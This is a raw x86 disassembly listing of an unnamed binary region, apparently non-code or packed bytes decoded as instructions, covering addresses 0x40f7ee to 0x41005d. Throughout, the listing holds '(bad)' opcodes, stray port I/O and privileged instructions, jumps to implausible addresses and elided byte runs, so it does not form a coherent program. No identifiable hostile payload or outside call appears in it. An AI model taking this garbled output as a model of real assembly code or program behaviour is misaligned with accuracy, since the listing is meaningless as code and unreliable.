  40f7ee:	imul   eax,DWORD PTR [edx],0xffffff83
  40f7f1:	ret    
  40f7f2:	int3   
  40f7f3:	adc    BYTE PTR [ecx-0x2],bh
  40f7f6:	jne    0x40f7a2
  40f7f8:	jbe    0x40f849
  40f7fa:	fcomip st,st(2)
  40f7fc:	push   es
  40f7fd:	call   FWORD PTR ds:0xf0412983
  40f803:	add    eax,0x5df01afd
  40f808:	or     eax,eax
  40f80a:	out    dx,eax
  40f80b:	push   es
  40f80c:	ins    BYTE PTR es:[edi],dx
  40f80d:	test   al,0xf0
  40f80f:	push   es
  40f810:	jmp    0xe8b02c55
  40f815:	add    esi,eax
  40f817:	push   es
  40f818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f819:	mov    esi,0x3ed6fa3
  40f81e:	lock fsub st(0),st
  40f821:	in     eax,dx
  40f822:	(bad)  
  40f823:	fucomp st(0)
  40f825:	in     eax,dx
  40f826:	xchg   DWORD PTR [edx-0x7dd08fdd],eax
  40f82c:	imul   ebp,DWORD PTR [edi+0x7e],0x6f
  40f830:	popf   
  40f831:	shr    DWORD PTR [esi-0x7],cl
  40f834:	nop
  40f835:	js     0x40f813
  40f837:	jb     0x40f7b9
  40f839:	(bad)  
  40f83a:	cli    
  40f83b:	push   es
  40f83c:	jmp    0xe43b284d
  40f841:	push   0x0
	...
  40f853:	add    cl,al
  40f855:	add    eax,0x50d803e9
  40f85a:	rol    dl,0x3f
  40f85d:	jo     0x40f83a
  40f85f:	pop    es
  40f860:	dec    eax
  40f861:	imul   BYTE PTR [eax+edi*2+0x5361d62e]
  40f868:	je     0x40f7f3
  40f86a:	push   esp
  40f86b:	jo     0x40f88b
  40f86d:	outs   dx,DWORD PTR ds:[esi]
  40f86e:	cwde   
  40f86f:	aad    0xf
  40f871:	out    0xac,al
  40f873:	js     0x40f883
  40f875:	jge    0x40f8e2
  40f877:	push   edi
  40f878:	(bad)  
  40f879:	outs   dx,BYTE PTR ds:[esi]
  40f87a:	sub    eax,0x25be456b
  40f87f:	js     0x40f80a
  40f881:	push   es
  40f882:	xchg   ecx,eax
  40f883:	imul   esi,DWORD PTR [esi],0xffffffc8
  40f886:	call   0x158c9503
  40f88b:	js     0x40f86b
  40f88d:	outs   dx,BYTE PTR ds:[esi]
  40f88e:	mov    ebx,0xe8c808e6
  40f893:	imul   eax,DWORD PTR [ebp+0x3ff5ffc2],0x7f
  40f89a:	test   cl,bh
  40f89c:	dec    edi
  40f89d:	ins    DWORD PTR es:[edi],dx
  40f89e:	(bad)  
  40f89f:	push   ebx
  40f8a0:	in     al,dx
  40f8a1:	fsubp  st(4),st
  40f8a3:	es mov ch,0x6e
  40f8a6:	std    
  40f8a7:	pushf  
  40f8a8:	dec    eax
  40f8a9:	jne    0x40f8a9
  40f8ab:	into   
  40f8ac:	daa    
  40f8ad:	xor    ebp,DWORD PTR [ebp+0x10]
  40f8b0:	lods   eax,DWORD PTR ds:[esi]
  40f8b1:	outs   dx,BYTE PTR ds:[esi]
  40f8b2:	out    0x61,al
  40f8b4:	mov    ebx,0x60fe6d
	...
  40f8c9:	add    BYTE PTR [ecx+0x62],dh
  40f8cc:	imul   BYTE PTR [esi+0x10ffe007]
  40f8d2:	add    al,ch
  40f8d4:	inc    eax
  40f8d5:	jmp    0x9f1cabc0
  40f8da:	fild   QWORD PTR [esi+edi*8-0x2c]
  40f8de:	dec    eax
  40f8df:	pop    ds
  40f8e0:	inc    ecx
  40f8e1:	jmp    0x7e8be8b1
  40f8e6:	(bad)  
  40f8e7:	jle    0x40f86d
  40f8e9:	adc    edi,0xf403fe6c
  40f8ef:	fdivrp st(6),st
  40f8f1:	scas   al,BYTE PTR es:[edi]
  40f8f2:	sub    al,0x6e
  40f8f4:	std    
  40f8f5:	xchg   esp,eax
  40f8f6:	enter  0xfe74,0x56
  40f8fa:	lahf   
  40f8fb:	xor    ch,BYTE PTR [ebp+0x0]
  40f8fe:	xor    eax,0x2aa5e66e
  40f903:	ins    DWORD PTR es:[edi],dx
  40f904:	(bad)  
  40f905:	jo     0x40f978
  40f907:	push   0xfffffff6
  40f909:	ss jg  0x40f8eb
  40f90c:	inc    eax
  40f90e:	xchg   esp,eax
  40f910:	inc    eax
  40f911:	jmp    0x171cab94
  40f916:	ins    DWORD PTR es:[di],dx
  40f918:	(bad)  
  40f919:	(bad)  
  40f91b:	push   ds
  40f91c:	inc    ecx
  40f91d:	jmp    0x8c256d
  40f922:	out    dx,al
  40f923:	cmc    
  40f924:	xchg   DWORD PTR [ebp-0x22207],eax
  40f92a:	pop    edx
  40f92b:	mov    al,0xea
  40f92d:	test   DWORD PTR [eax],0x0
	...
  40f93f:	add    dh,cl
  40f941:	hlt    
  40f942:	(bad)  
  40f943:	jae    0x40f93f
  40f945:	pop    edx
  40f946:	(bad)  
  40f947:	(bad)  
  40f948:	mov    esi,0x9175fdb3
  40f94d:	loope  0x40f8e0
  40f94f:	inc    esp
  40f950:	scas   al,BYTE PTR es:[edi]
  40f951:	hlt    
  40f952:	std    
  40f953:	mov    ch,0x59
  40f955:	fdiv   st(5),st
  40f957:	dec    DWORD PTR [esi+0x76]
  40f95a:	push   es
  40f95b:	call   0x3ea716
  40f960:	dec    esi
  40f961:	mov    dh,0xea
  40f963:	test   DWORD PTR [esi-0xc],0xe16175fd
  40f96a:	xlat   BYTE PTR ds:[ebx]
  40f96b:	inc    esp
  40f96c:	jle    0x40f962
  40f96e:	std    
  40f96f:	mov    ch,0x71
  40f971:	fdiv   st(5),st
  40f973:	jmp    FWORD PTR [esi+0x76]
  40f976:	push   es
  40f977:	call   0x3ea6fe
  40f97c:	mov    esi,0xcef7e2b6
  40f981:	hlt    
  40f982:	std    
  40f983:	jne    0x40f9c6
  40f985:	loope  0x40f942
  40f987:	inc    esp
  40f988:	into   
  40f989:	hlt    
  40f98a:	std    
  40f98b:	mov    ch,0xb9
  40f98d:	fdiv   st(5),st
  40f98f:	jmp    FWORD PTR [esi+0x7ee80676]
  40f995:	lods   eax,DWORD PTR ds:[esi]
  40f996:	std    
  40f997:	dec    esi
  40f999:	mov    dh,0xda
  40f99b:	idiv   DWORD PTR [esi+0x1175fdf4]
  40f9a1:	loope  0x40fa21
  40f9a3:	inc    BYTE PTR [eax]
	...
  40f9b5:	add    dh,cl
  40f9b7:	hlt    
  40f9b8:	std    
  40f9b9:	mov    ch,0x2d
  40f9bb:	(bad)  
  40f9bd:	push   eax
  40f9bf:	add    eax,0xfddf46aa
  40f9c4:	jne    0x40f97a
  40f9c6:	loopne 0x40fa35
  40f9c8:	je     0x40f9c8
  40f9ca:	fdivr  DWORD PTR [esi+0x75c7febd]
  40f9d0:	scas   al,BYTE PTR es:[edi]
  40f9d1:	jmp    0x40f99a
  40f9d3:	pop    ebp
  40f9d4:	je     0x40f9bd
  40f9d6:	pop    ebp
  40f9d7:	sbb    eax,0x93affe75
  40f9dc:	imul   esi,esi,0xffffffa7
  40f9df:	push   ebp
  40f9e0:	imul   ecx,DWORD PTR [ecx-0x18bc2c9],0x5d
  40f9e7:	cmp    ch,BYTE PTR [esi+edi*8-0x71]
  40f9eb:	push   esi
  40f9ec:	hlt    
  40f9ed:	inc    esi
  40f9ee:	xchg   DWORD PTR [ebp-0x4a6f4b8c],esi
  40f9f4:	je     0x40f9f4
  40f9f6:	mov    BYTE PTR [edx],cl
  40f9f8:	mov    ebp,0xbe8d6ffe
  40f9fd:	neg    DWORD PTR [ecx-0x2]
  40fa00:	jne    0x40fa00
  40fa02:	pop    edi
  40fa03:	jge    0x40f9f3
  40fa05:	sti    
  40fa06:	dec    eax
  40fa07:	les    ebx,FWORD PTR [edx]
  40fa09:	add    al,dh
  40fa0b:	mov    dh,0x41
  40fa0d:	pop    es
  40fa0e:	lock or cl,BYTE PTR [ecx+0x77a273eb]
  40fa15:	imul   esi,eax,0xfec957
	...
  40fa2b:	add    BYTE PTR [ebp-0x537a958b],ah
  40fa31:	aam    0x74
  40fa33:	mov    BYTE PTR [ebp-0x50371447],dh
  40fa39:	sahf   
  40fa3a:	add    bh,bh
  40fa3c:	test   DWORD PTR [ebp+0x6a],esi
  40fa3f:	pop    es
  40fa40:	push   es
  40fa41:	xor    eax,0x1985fe75
  40fa46:	jne    0x40fabc
  40fa48:	call   0x33f40b53
  40fa4d:	ins    BYTE PTR es:[edi],dx
  40fa4e:	sbb    eax,0xe902b14b
  40fa53:	into   
  40fa54:	push   0x5a
  40fa56:	imul   eax,DWORD PTR [eax-0x1d],0xd8077b6b
  40fa5d:	and    ecx,esp
  40fa5f:	add    esi,eax
  40fa61:	jmp    FWORD PTR [eax]
  40fa63:	out    dx,eax
  40fa64:	repz cmp eax,0x6bf0082a
  40fa6a:	pop    ebx
  40fa6b:	adc    al,0x98
  40fa6d:	adc    DWORD PTR [ecx],eax
  40fa6f:	add    al,0xf0
  40fa71:	jmp    FWORD PTR [eax-0x55c20c12]
  40fa77:	pop    es
  40fa78:	lock jge 0x40faa6
  40fa7b:	jl     0x40fa0b
  40fa7d:	icebp  
  40fa7e:	shr    BYTE PTR [ebx-0x24],0xc3
  40fa82:	mov    ch,0x74
  40fa84:	push   0xfc74acc1
  40fa89:	push   0xffffffa5
  40fa8b:	out    dx,al
  40fa8c:	imul   edx,DWORD PTR [bp+di],0x14
	...
  40faa0:	add    BYTE PTR [eax],al
  40faa2:	pop    eax
  40faa3:	cmp    al,0x3a
  40faa5:	jne    0x40fb05
  40faa7:	jmp    FWORD PTR [eax+0x2b7e1aef]
  40faad:	jo     0x40fa88
  40faaf:	push   es
  40fab0:	ins    BYTE PTR es:[edi],dx
  40fab1:	mov    esi,0xee75d643
  40fab6:	cmp    ebx,DWORD PTR [esi-0x46]
  40fab9:	out    0x36,eax
  40fabb:	imul   esi,ecx,0x43
  40fabe:	mov    ds:0x3d124,eax
  40fac3:	pop    esp
  40fac4:	xchg   esi,eax
  40fac5:	je     0x40fa6b
  40fac7:	inc    BYTE PTR [eax-0x2d]
  40faca:	mov    dl,0x6b
  40facc:	inc    ebp
  40facd:	je     0x40fa53
  40facf:	cli    
  40fad0:	cmp    eax,0xff5eefee
  40fad5:	lea    esi,[eax]
  40fad7:	ins    BYTE PTR es:[edi],dx
  40fad8:	(bad)  
  40fad9:	cs push es
  40fadb:	ja     0x40fadb
  40fadd:	pushf  
  40fade:	imul   esi,DWORD PTR [si-0xf],0x1642db5b
  40fae6:	imul   esi,DWORD PTR fs:[ebp+ecx*1+0x4b],0x440645a4
  40faef:	aas    
  40faf0:	shr    ebp,0xf3
  40faf3:	ror    DWORD PTR [edx-0x2cb98ffb],cl
  40faf9:	xchg   edi,eax
  40fafa:	cmp    al,0xf3
  40fafc:	or     edx,ecx
  40fafe:	fwait
  40faff:	mov    ebp,0xaaa7defe
  40fb04:	je     0x40faf2
	...
  40fb16:	add    BYTE PTR [eax],al
  40fb18:	sar    DWORD PTR [edi],0xc1
  40fb1b:	(bad)  
  40fb1d:	jnp    0x40fb63
  40fb1f:	mov    ecx,0xed7469a4
  40fb24:	sub    ecx,DWORD PTR [edi]
  40fb26:	dec    esp
  40fb27:	mov    dh,0x3
  40fb29:	std    
  40fb2a:	mov    edi,0xff4a6fde
  40fb2f:	call   0x9db56527
  40fb34:	les    eax,FWORD PTR [edx+0x7ee39645]
  40fb3a:	inc    esp
  40fb3b:	jge    0x40fb20
  40fb3d:	repnz sti 
  40fb3f:	xchg   BYTE PTR [ecx+0x5e],cl
  40fb42:	(bad)  
  40fb43:	hlt    
  40fb44:	(bad)  [ecx-0x56]
  40fb47:	das    
  40fb48:	ret    
  40fb49:	push   0x5e97f48a
  40fb4e:	mov    ds:0x6806f3e9,al
  40fb53:	add    eax,0xbeffc764
  40fb58:	mov    ebx,0xf3e91771
  40fb5d:	std    
  40fb5e:	mov    edi,0xe8ff4c00
  40fb63:	cwde   
  40fb64:	sbb    DWORD PTR [esi],eax
  40fb66:	add    BYTE PTR [ebx+0x48224ab9],cl
  40fb6c:	dec    eax
  40fb6d:	push   es
  40fb6e:	call   0x46e9ac
  40fb73:	add    ecx,DWORD PTR [ecx]
  40fb75:	in     al,dx
  40fb76:	jae    0x40fb60
  40fb78:	jno    0x40fbab
  40fb7a:	dec    eax
  40fb7b:	inc    ecx
	...
  40fb8c:	add    BYTE PTR [eax],al
  40fb8e:	leave  
  40fb8f:	dec    edi
  40fb90:	out    0xd3,al
  40fb92:	rol    DWORD PTR ds:0x70190b00,1
  40fb98:	add    bl,ch
  40fb9a:	aas    
  40fb9b:	in     al,dx
  40fb9c:	push   cs
  40fb9d:	mov    BYTE PTR [eax+eiz*8-0x79],bl
  40fba1:	inc    ebp
  40fba2:	mov    ebp,0xd848344d
  40fba7:	add    dl,BYTE PTR [esi-0x18]
  40fbaa:	cmp    ebp,0xffffffff
  40fbad:	call   DWORD PTR [edx-0x5dfd8c3b]
  40fbb3:	push   esi
  40fbb4:	mov    eax,esi
  40fbb6:	and    DWORD PTR ds:0xcd894148,ebp
  40fbbc:	cld    
  40fbbd:	push   ss
  40fbbe:	mov    DWORD PTR ds:0x6ee0f003,eax
  40fbc4:	fisubr DWORD PTR [eax+0x3d]
  40fbc7:	lods   eax,DWORD PTR ds:[esi]
  40fbc8:	aas    
  40fbc9:	add    BYTE PTR [edi],bl
  40fbcb:	retf   
  40fbcc:	xchg   esi,eax
  40fbcd:	sbb    BYTE PTR [ecx+0x5],cl
  40fbd0:	or     eax,eax
  40fbd2:	dec    esp
  40fbd3:	add    ebp,ebx
  40fbd5:	cmp    eax,ebx
  40fbd7:	adc    eax,0xea5e5588
  40fbdc:	inc    ebx
  40fbdd:	fcom   st(2)
  40fbdf:	ds loop 0x40fba8
  40fbe2:	sbb    DWORD PTR ds:0xbfb1458b,eax
  40fbe8:	(bad)  
  40fbe9:	push   eax
  40fbeb:	shl    bh,1
  40fbed:	fist   DWORD PTR [edi]
  40fbef:	push   edx
  40fbf0:	pop    edx
  40fbf1:	inc    BYTE PTR [eax]
	...
  40fc03:	add    BYTE PTR [ebp+0x6925a77],al
  40fc09:	sub    BYTE PTR [edx-0x77],dh
  40fc0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc0d:	mov    esp,0xe70c447d
  40fc12:	adc    cl,BYTE PTR [edx+0x447e2945]
  40fc18:	enter  0x12f6,0x80
  40fc1c:	push   ds
  40fc1d:	pop    esi
  40fc1e:	add    DWORD PTR [ebp-0x18e06c4],eax
  40fc24:	iret   
  40fc25:	jmp    0x40fc85
  40fc27:	out    0x91,eax
  40fc29:	mov    ds:0x9b6dfe71,eax
  40fc2e:	jb     0x40fc7f
  40fc30:	enter  0xbe21,0xfe
  40fc34:	scas   eax,DWORD PTR es:[edi]
  40fc35:	push   ebp
  40fc36:	add    ebx,DWORD PTR [esi-0x47]
  40fc39:	pushf  
  40fc3a:	(bad)  
  40fc3b:	inc    DWORD PTR [ebp-0x1b]
  40fc3e:	pop    edi
  40fc3f:	(bad)  
  40fc40:	sbb    eax,0x39d45a4a
  40fc45:	inc    ecx
  40fc46:	jo     0x40fc52
  40fc48:	mov    al,0x32
  40fc4a:	sbb    ebp,DWORD PTR [eax-0x9]
  40fc4d:	and    eax,0x4627ffc3
  40fc52:	fisttp QWORD PTR [eax+0x6f]
  40fc55:	mov    eax,ds:0xabf667d3
  40fc5a:	ret    
  40fc5b:	call   edi
  40fc5d:	pop    ebp
  40fc5e:	add    ch,bh
  40fc60:	xchg   esi,eax
  40fc61:	push   es
  40fc62:	or     al,0x48
  40fc64:	mov    cl,0x5d
  40fc66:	sar    dh,cl
	...
  40fc78:	add    BYTE PTR [eax],al
  40fc7a:	mov    ebp,0xc8815a75
  40fc7f:	lock jo 0x40fc69
  40fc82:	cdq    
  40fc83:	and    dh,BYTE PTR [ecx-0x2]
  40fc86:	cmp    DWORD PTR [edi],eax
  40fc88:	sub    edi,esp
  40fc8a:	daa    
  40fc8b:	shl    DWORD PTR [ecx+0x60],cl
  40fc8e:	jb     0x40fcd3
  40fc90:	push   esp
  40fc91:	ficom  WORD PTR [edi]
  40fc93:	fisub  WORD PTR [edx+0x50fe8470]
  40fc99:	in     eax,dx
  40fc9a:	mov    cl,0x67
  40fc9c:	cmp    eax,0xc26ab47b
  40fca1:	or     eax,0x5be0f1f7
  40fca6:	xchg   esp,eax
  40fca7:	addr16 and eax,0x1e245971
  40fcad:	div    edi
  40fcaf:	pop    esi
  40fcb0:	jno    0x40fd23
  40fcb2:	(bad)  
  40fcb3:	or     BYTE PTR [bx],0xcf
  40fcb7:	icebp  
  40fcb8:	lock pop ebx
  40fcba:	pusha  
  40fcbb:	addr16 std 
  40fcbd:	jo     0x40fd16
  40fcbf:	pop    es
  40fcc0:	jmp    0xdb1f7225
  40fcc5:	mov    ebx,0x9510730
  40fcca:	cmp    dh,al
  40fccc:	call   0xc1402141
  40fcd1:	or     ch,BYTE PTR es:[eax-0x33]
  40fcd5:	jo     0x40fcdb
  40fcd7:	imul   eax,ebp,0xfffffff6
  40fcda:	out    dx,eax
  40fcdb:	pop    esi
  40fcdc:	mov    BYTE PTR ds:[eax],0x0
	...
  40fcf0:	jle    0x40fd59
  40fcf2:	lahf   
  40fcf3:	inc    ebp
  40fcf4:	repz push es
  40fcf6:	adc    al,0x7d
  40fcf8:	pop    ebx
  40fcf9:	test   DWORD PTR [ebx+ecx*2+0x7e9d675e],ebp
  40fd00:	mov    ah,0x6a
  40fd02:	cmp    BYTE PTR [ecx-0x24],dh
  40fd05:	cli    
  40fd06:	(bad)  
  40fd07:	div    bh
  40fd09:	pop    esi
  40fd0a:	sub    al,0x19
  40fd0c:	lock push es
  40fd0e:	repnz inc ebx
  40fd10:	out    dx,al
  40fd11:	cmp    edi,0x6f2a8
  40fd17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd18:	outs   dx,DWORD PTR ss:[esi]
  40fd1a:	(bad)  
  40fd1b:	call   0xa5080413
  40fd20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd21:	push   0xdcf3e906
  40fd26:	inc    edx
  40fd28:	repz fdiv st(7),st
  40fd2b:	shl    bl,cl
  40fd2d:	jns    0x40fd73
  40fd2f:	xor    eax,0x3d847a23
  40fd34:	js     0x40fd9e
  40fd36:	(bad)  
  40fd37:	cdq    
  40fd38:	pusha  
  40fd39:	fcomi  st,st(7)
  40fd3b:	fisub  WORD PTR es:[edx-0x19]
  40fd3f:	idiv   eax
  40fd41:	push   es
  40fd42:	add    dl,ah
  40fd44:	xor    ebx,edx
  40fd46:	add    al,0x0
  40fd48:	je     0x40fd51
  40fd4a:	add    cl,ch
  40fd4c:	stos   DWORD PTR es:[edi],eax
  40fd4d:	inc    esp
  40fd4e:	daa    
  40fd4f:	test   al,0xf3
  40fd51:	gs je  0x40fd39
	...
  40fd64:	add    BYTE PTR [eax],al
  40fd66:	sbb    ebx,DWORD PTR [edi]
  40fd68:	dec    eax
  40fd69:	out    dx,al
  40fd6a:	pop    ds
  40fd6b:	(bad)  
  40fd6c:	mov    bh,BYTE PTR [ecx-0x290c748f]
  40fd72:	pcmpgtw mm1,QWORD PTR [edi+0x3b]
  40fd76:	xor    al,0x2f
  40fd78:	dec    eax
  40fd79:	into   
  40fd7a:	pop    ds
  40fd7b:	pop    DWORD PTR [ecx+eiz*4-0x2e019b01]
  40fd82:	(bad)  
  40fd86:	call   0xffc7:0xac4b6666
  40fd8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd8e:	test   eax,0xcf9ef63e
  40fd93:	fs je  0x40fd77
  40fd96:	mov    ebx,0xdf8e4687
  40fd9b:	mov    es,WORD PTR [eax+eax*1-0x22237]
  40fda2:	jecxz  0x40fdae
  40fda4:	push   0xfe4c116b
  40fda9:	(bad)  
  40fdaa:	in     al,0xd2
  40fdac:	cmc    
  40fdad:	dec    DWORD PTR [esi-0x3ef78c0b]
  40fdb3:	ins    DWORD PTR es:[edi],dx
  40fdb4:	inc    ebp
  40fdb5:	(bad)  
  40fdb6:	mov    esi,0xa6ec83e3
  40fdbb:	cmc    
  40fdbc:	std    
  40fdbd:	push   0x19
  40fdbf:	inc    edx
  40fdc0:	jb     0x40fe0a
  40fdc2:	dec    eax
  40fdc3:	or     bh,bh
  40fdc5:	mov    ch,0xe1
  40fdc7:	(bad)  
  40fdc9:	inc    DWORD PTR [eax]
	...
  40fddb:	add    BYTE PTR [esi],bl
  40fddd:	pusha  
  40fdde:	push   es
  40fddf:	call   0x3e4a81
  40fde4:	pusha  
  40fde5:	nop
  40fde6:	out    0xf7,al
  40fde8:	(bad)  
  40fde9:	cmc    
  40fdea:	mov    eax,DWORD PTR [ebp-0x221e3]
  40fdf0:	imul   eax,DWORD PTR [ecx+0x7b],0xff098848
  40fdf7:	mov    ch,0xe1
  40fdf9:	(bad)  
  40fdfb:	call   FWORD PTR [esi-0x217f9a2]
  40fe01:	dec    ebp
  40fe02:	std    
  40fe03:	jmp    DWORD PTR [eax]
  40fe05:	(bad)  
  40fe06:	loop   0x40fdff
  40fe08:	mov    esi,0x310068f4
  40fe0d:	jecxz  0x40fe55
  40fe0f:	inc    ecx
  40fe10:	cdq    
  40fe11:	hlt    
  40fe12:	mov    bl,0xd8
  40fe14:	inc    esi
  40fe15:	hlt    
  40fe16:	std    
  40fe17:	push   DWORD PTR [edx+eiz*2-0x9e9ee1a]
  40fe1e:	std    
  40fe1f:	mov    esp,edx
  40fe21:	jmp    0x88bffe1b
  40fe26:	mov    ebx,0x6d84f0f0
  40fe2b:	(bad)  
  40fe2c:	lock sti 
  40fe2e:	fiadd  DWORD PTR [edx-0x18a847b]
  40fe34:	aas    
  40fe35:	outs   dx,DWORD PTR ds:[esi]
  40fe36:	mul    BYTE PTR [ecx+0x73]
  40fe39:	sbb    bl,BYTE PTR [ebx-0xa]
  40fe3c:	das    
  40fe3d:	hlt    
  40fe3e:	add    dh,BYTE PTR [eax+eax*1+0x0]
	...
  40fe52:	leave  
  40fe53:	aaa    
  40fe54:	add    al,BYTE PTR [eax]
  40fe56:	jne    0xc84172c9
  40fe5c:	(bad)  
  40fe5d:	aas    
  40fe5e:	paddq  mm5,QWORD PTR [ebp-0x4c]
  40fe62:	add    BYTE PTR [esi+ebp*2],ah
  40fe65:	(bad)  
  40fe66:	call   FWORD PTR [ecx-0x50b717ee]
  40fe6c:	ins    DWORD PTR es:[edi],dx
  40fe6d:	(bad)  
  40fe6e:	out    dx,eax
  40fe6f:	fistp  DWORD PTR [esi-0xa]
  40fe72:	out    0x2d,eax
  40fe74:	outs   dx,BYTE PTR ds:[esi]
  40fe75:	je     0x40fe77
  40fe77:	test   BYTE PTR [eax+0x6dfdd73f],0xb4
  40fe7e:	fdivr  st,st(5)
  40fe80:	ins    DWORD PTR es:[edi],dx
  40fe81:	inc    bh
  40fe83:	jecxz  0x40fe97
  40fe85:	call   0xfeaeacf6
  40fe8a:	mov    bh,0x23
  40fe8c:	dec    edi
  40fe8d:	imul   BYTE PTR [edi-0x734b938b]
  40fe93:	inc    ebp
  40fe94:	ins    BYTE PTR es:[edi],dx
  40fe95:	(bad)  
  40fe96:	lahf   
  40fe97:	mov    ebx,0x2e24e813
  40fe9c:	ins    DWORD PTR es:[edi],dx
  40fe9d:	dec    BYTE PTR [edi-0x78099c85]
  40fea3:	dec    ebp
  40fea4:	ins    BYTE PTR es:[edi],dx
  40fea5:	je     0x40fe87
  40fea7:	xor    eax,0x9d773fd9
  40feac:	ins    BYTE PTR es:[edi],dx
  40fead:	je     0x40feaf
  40feaf:	mov    ch,0xb6
  40feb1:	xlat   BYTE PTR ds:[ebx]
  40feb2:	pop    edi
  40feb3:	pop    es
  40feb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feb5:	ins    DWORD PTR es:[edi],dx
	...
  40fec6:	add    BYTE PTR [eax],al
  40fec8:	pop    esi
  40fec9:	(bad)  
  40fecb:	pop    ebx
  40fecc:	loope  0x40ff32
  40fece:	xchg   ebp,eax
  40fecf:	ins    DWORD PTR es:[edi],dx
  40fed0:	dec    esi
  40fed1:	call   0xe190:0x644675b0
  40fed8:	mov    dl,0x63
  40feda:	jge    0x40ff49
  40fedc:	jl     0x40ff35
  40fede:	jge    0x40ff4d
  40fee0:	outs   dx,DWORD PTR cs:[esi]
  40fee2:	adc    cl,al
  40fee4:	es fs gs mov bh,0xb
  40fee9:	pop    esp
  40feea:	pop    ebp
  40feeb:	ins    DWORD PTR es:[edi],dx
  40feec:	psrld  mm5,QWORD PTR [ecx-0x6c9bf194]
  40fef3:	pop    esp
  40fef4:	(bad)  
  40fef5:	arpl   WORD PTR [ebp+0x5c],ax
  40fef8:	mov    cl,0xc7
  40fefa:	cmp    eax,0x4c99f66d
  40feff:	jne    0x40feef
  40ff01:	arpl   WORD PTR [eax+0x35],ax
  40ff04:	xor    esp,DWORD PTR [ebp+eiz*1+0x6d]
  40ff08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff09:	adc    ax,0xd66d
  40ff0d:	outs   dx,BYTE PTR ds:[esi]
  40ff0e:	(bad)  
  40ff0f:	ror    dh,0x63
  40ff12:	or     eax,0xb56dbfc7
  40ff17:	ins    DWORD PTR es:[edi],dx
  40ff18:	mov    esi,0xbbf6fd63
  40ff1d:	outs   dx,BYTE PTR ds:[esi]
  40ff1e:	jle    0x40ff36
  40ff20:	lock push es
  40ff22:	and    BYTE PTR [edx-0x5],al
  40ff25:	push   es
  40ff26:	cmp    al,0x79
  40ff28:	mov    eax,DWORD PTR [edi+0x6fa4]
	...
  40ff3e:	or     DWORD PTR [edi],eax
  40ff40:	inc    ebx
  40ff41:	mov    ecx,0x5be0d98e
  40ff46:	(bad)
  40ff49:	ins    BYTE PTR es:[edi],dx
  40ff4a:	push   0xfc6cbcc9
  40ff4f:	push   cs
  40ff50:	add    BYTE PTR [ecx+0x1e],al
  40ff53:	iret   
  40ff54:	inc    eax
  40ff55:	jmp    0xd0ae1a2e
  40ff5a:	xor    ah,BYTE PTR [ebx-0x1a]
  40ff5d:	xchg   ebp,eax
  40ff5e:	(bad)  
  40ff5f:	fs (bad) 
  40ff61:	xchg   esi,eax
  40ff62:	inc    esi
  40ff63:	or     ebp,DWORD PTR [eax-0x31]
  40ff66:	mov    eax,esi
  40ff68:	call   DWORD PTR [eax]
  40ff6a:	repnz push es
  40ff6c:	add    BYTE PTR [ecx-0x65],ch
  40ff6f:	gs cld 
  40ff71:	jbe    0x40ff0f
  40ff73:	fs je  0x40ffe3
  40ff76:	xchg   esp,eax
  40ff77:	fiadd  DWORD PTR [edi]
  40ff79:	push   ecx
  40ff7a:	inc    edx
  40ff7b:	and    edi,edi
  40ff7d:	pop    esi
  40ff7e:	fiadd  DWORD PTR [ebp+0x3]
  40ff81:	jmp    0x6b2c8fac
  40ff86:	scas   eax,DWORD PTR es:[edi]
  40ff87:	pop    edi
  40ff88:	imul   ebp,ecx,0xb4fecf19
  40ff8e:	sti    
  40ff8f:	push   0xfffffff4
  40ff91:	neg    BYTE PTR [ecx+eiz*2-0x78]
  40ff95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff96:	push   edi
  40ff97:	jmp    0x7467:0xa43ce8ff
  40ff9e:	fwait
  40ff9f:	(bad)  
  40ffa0:	inc    DWORD PTR [eax+0x0]
	...
  40ffb2:	add    BYTE PTR [eax],al
  40ffb4:	xchg   ebx,eax
  40ffb5:	retf   0xe940
  40ffb8:	push   esp
  40ffb9:	fild   DWORD PTR [edi]
  40ffbb:	adc    DWORD PTR [esi+0x4bfefee9],ecx
  40ffc1:	(bad)  
  40ffc3:	mul    BYTE PTR [ebp-0x4c2817f6]
  40ffc9:	popa   
  40ffca:	(bad)  
  40ffcb:	mov    al,0x36
  40ffcd:	push   es
  40ffce:	add    BYTE PTR [edi+edx*1],dh
  40ffd1:	outs   dx,BYTE PTR ds:[esi]
  40ffd2:	sub    BYTE PTR [ebp-0x3101a6dc],0x9
  40ffd9:	retf   
  40ffda:	sti    
  40ffdb:	add    cl,bl
  40ffdd:	in     eax,dx
  40ffde:	jae    0x40ffec
  40ffe0:	ss pop eax
  40ffe2:	push   es
  40ffe3:	call   0x40f76d
  40ffe8:	push   edx
  40ffe9:	(bad)  
  40ffea:	or     eax,0xc5c85
  40ffef:	add    BYTE PTR [esi+0x5900f648],cl
  40fff5:	push   es
  40fff6:	add    bh,al
  40fff8:	or     al,0xd7
  40fffa:	std    
  40fffb:	pop    es
  40fffc:	dec    ecx
  40fffd:	push   es
  40fffe:	push   0x0
  410000:	jecxz  0x41000c
  410002:	push   0x0
  410004:	repz or cl,BYTE PTR [ebp-0x74c562bb]
  41000b:	test   DWORD PTR [ebp+0x59fffdd5],edi
  410011:	in     eax,dx
  410012:	jae    0x41000c
  410014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410015:	push   edi
  410016:	cli    
  410017:	call   0x41001c
	...
  410028:	add    BYTE PTR [eax],al
  41002a:	xchg   esi,esi
  41002c:	(bad)  
  41002d:	inc    DWORD PTR [edx]
  41002f:	(bad)  
  410030:	jb     0x410037
  410032:	mov    al,ds:0xd9ffffd2
  410037:	cmp    eax,0x59828dc
  41003c:	push   DWORD PTR [ebp-0x1b]
  41003f:	mov    ebp,0xedf645cf
  410044:	dec    esi
  410045:	mov    ecx,DWORD PTR [ecx]
  410047:	loopne 0x40ffcc
  410049:	hlt    
  41004a:	fsubp  st(5),st
  41004c:	std    
  41004d:	push   eax
  41004e:	pop    ebx
  41004f:	mov    ebp,0xecb645bf
  410054:	xchg   DWORD PTR [ebp-0x229ff],eax
  41005a:	icebp  
  41005b:	cmc    
  41005c:	inc    ecx
  41005d:	call   DWORD PTR [esi+0x4e67fe43]
